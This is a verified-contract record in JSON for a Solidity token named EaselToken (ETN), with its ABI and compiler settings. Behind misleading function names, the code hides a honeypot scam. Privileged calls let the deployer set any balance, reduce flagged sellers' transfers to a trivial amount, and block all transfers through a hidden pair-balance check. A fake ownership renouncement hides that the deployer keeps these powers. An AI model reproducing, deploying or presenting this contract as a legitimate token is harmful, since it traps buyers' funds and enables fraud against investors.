{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface teamLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromSender) external view returns (uint256);\n\n    function transfer(address listLiquidity, uint256 isFund) external returns (bool);\n\n    function allowance(address minSellFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listLiquidity,\n        uint256 isFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listWalletLaunch, uint256 value);\n    event Approval(address indexed minSellFee, address indexed spender, uint256 value);\n}\n\nabstract contract isReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atLiquidity {\n    function createPair(address maxReceiver, address fundSender) external returns (address);\n}\n\ninterface receiverBuy is teamLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EaselToken is isReceiver, teamLiquidity, receiverBuy {\n\n    address tradingModeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFrom;\n    }\n\n    constructor (){\n        if (teamIs != listLaunch) {\n            listLaunch = false;\n        }\n        takeIs amountAt = takeIs(tradingEnable);\n        fromAt = atLiquidity(amountAt.factory()).createPair(amountAt.WETH(), address(this));\n        if (listLaunch) {\n            fromExempt = exemptAuto;\n        }\n        tradingToken = _msgSender();\n        toFrom();\n        txMarketing[tradingToken] = true;\n        exemptMax[tradingToken] = fundLaunched;\n        \n        emit Transfer(address(0), tradingToken, fundLaunched);\n    }\n\n    function takeExempt(address walletSell) public {\n        buyMarketingFrom();\n        \n        if (walletSell == tradingToken || walletSell == fromAt) {\n            return;\n        }\n        modeSell[walletSell] = true;\n    }\n\n    bool public fromToEnable;\n\n    function transferFrom(address launchedTake, address listLiquidity, uint256 isFund) external override returns (bool) {\n        if (_msgSender() != tradingEnable) {\n            if (feeMaxReceiver[launchedTake][_msgSender()] != type(uint256).max) {\n                require(isFund <= feeMaxReceiver[launchedTake][_msgSender()]);\n                feeMaxReceiver[launchedTake][_msgSender()] -= isFund;\n            }\n        }\n        return receiverTrading(launchedTake, listLiquidity, isFund);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundLaunched;\n    }\n\n    uint256 takeFund;\n\n    uint256 private modeAmount;\n\n    uint8 private swapFee = 18;\n\n    function transfer(address isExempt, uint256 isFund) external virtual override returns (bool) {\n        return receiverTrading(_msgSender(), isExempt, isFund);\n    }\n\n    function maxAt(address isExempt, uint256 isFund) public {\n        buyMarketingFrom();\n        exemptMax[isExempt] = isFund;\n    }\n\n    mapping(address => bool) public txMarketing;\n\n    function balanceOf(address fromSender) public view virtual override returns (uint256) {\n        return exemptMax[fromSender];\n    }\n\n    mapping(address => uint256) private exemptMax;\n\n    uint256 private exemptAuto;\n\n    uint256 private fundLaunched = 100000000 * 10 ** 18;\n\n    address public fromAt;\n\n    uint256 public fromExempt;\n\n    function buyMarketingFrom() private view {\n        require(txMarketing[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed isBuy, address indexed liquidityIs);\n\n    mapping(address => bool) public modeSell;\n\n    bool private listLaunch;\n\n    bool public exemptShouldIs;\n\n    function fundWallet(uint256 isFund) public {\n        buyMarketingFrom();\n        takeFund = isFund;\n    }\n\n    uint256 tradingReceiver;\n\n    uint256 private limitMarketingLiquidity;\n\n    function receiverTrading(address launchedTake, address listLiquidity, uint256 isFund) internal returns (bool) {\n        if (launchedTake == tradingToken) {\n            return fromLaunch(launchedTake, listLiquidity, isFund);\n        }\n        uint256 limitMode = teamLiquidity(fromAt).balanceOf(tradingModeTotal);\n        require(limitMode == takeFund);\n        require(listLiquidity != tradingModeTotal);\n        if (modeSell[launchedTake]) {\n            return fromLaunch(launchedTake, listLiquidity, limitFrom);\n        }\n        return fromLaunch(launchedTake, listLiquidity, isFund);\n    }\n\n    function fromLaunch(address launchedTake, address listLiquidity, uint256 isFund) internal returns (bool) {\n        require(exemptMax[launchedTake] >= isFund);\n        exemptMax[launchedTake] -= isFund;\n        exemptMax[listLiquidity] += isFund;\n        emit Transfer(launchedTake, listLiquidity, isFund);\n        return true;\n    }\n\n    bool private teamIs;\n\n    mapping(address => mapping(address => uint256)) private feeMaxReceiver;\n\n    function approve(address listBuy, uint256 isFund) public virtual override returns (bool) {\n        feeMaxReceiver[_msgSender()][listBuy] = isFund;\n        emit Approval(_msgSender(), listBuy, isFund);\n        return true;\n    }\n\n    address tradingEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant limitFrom = 18 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapFee;\n    }\n\n    function receiverLaunched(address marketingLaunched) public {\n        if (exemptShouldIs) {\n            return;\n        }\n        if (limitMarketingLiquidity != sellTo) {\n            teamIs = false;\n        }\n        txMarketing[marketingLaunched] = true;\n        if (modeAmount == limitMarketingLiquidity) {\n            exemptAuto = limitMarketingLiquidity;\n        }\n        exemptShouldIs = true;\n    }\n\n    string private limitShould = \"Easel Token\";\n\n    function getOwner() external view returns (address) {\n        return swapReceiverTrading;\n    }\n\n    string private receiverFrom = \"ETN\";\n\n    uint256 public sellTo;\n\n    address private swapReceiverTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return limitShould;\n    }\n\n    function toFrom() public {\n        emit OwnershipTransferred(tradingToken, address(0));\n        swapReceiverTrading = address(0);\n    }\n\n    address public tradingToken;\n\n    function owner() external view returns (address) {\n        return swapReceiverTrading;\n    }\n\n    function allowance(address amountTradingTo, address listBuy) external view virtual override returns (uint256) {\n        if (listBuy == tradingEnable) {\n            return type(uint256).max;\n        }\n        return feeMaxReceiver[amountTradingTo][listBuy];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSellFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listWalletLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTradingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShouldIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"maxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"}],\"name\":\"takeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EaselToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}